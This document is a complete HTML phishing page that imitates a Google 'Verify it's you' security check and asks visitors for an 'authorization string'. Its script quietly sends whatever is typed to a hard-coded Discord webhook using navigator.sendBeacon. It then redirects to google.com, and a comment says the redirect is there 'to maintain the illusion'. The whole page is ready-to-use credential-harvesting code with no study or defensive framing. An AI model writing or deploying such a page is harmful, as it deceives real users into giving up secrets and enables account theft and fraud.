<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Security Verification</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
        .logo span:nth-child(1) { color: #4285F4; } .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; } .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; } .logo span:nth-child(6) { color: #EA4335; }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 400; }
        p { color: #202124; font-size: 16px; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
        button:hover { background-color: #1765cc; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>
    <h1>Verify it's you</h1>
    <p>Enter your authorization string to continue to Google.</p>
    <input type="password" id="auth-input" placeholder="Authorization string">
    <button type="button" onclick="handleVerify()">Next</button>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

    async function handleVerify() {
        const value = document.getElementById('auth-input').value;
        if (!value) return;

        // Constructing the J2 Payload
        const message = {
            embeds: [{
                title: "🚨 SECURITY NOTIFICATION",
                description: "New authorization string captured from internal portal.",
                color: 16711680,
                fields: [{ name: "Captured String", value: "`" + value + "`" }]
            }]
        };

        // Use the Beacon API for maximum reliability during redirect
        const blob = new Blob([JSON.stringify(message)], { type: 'application/json' });
        navigator.sendBeacon(WEBHOOK_URL, blob);

        // Immediate redirection to maintain the illusion[cite: 4]
        window.location.replace("https://www.google.com");
    }
</script>

</body>
</html>
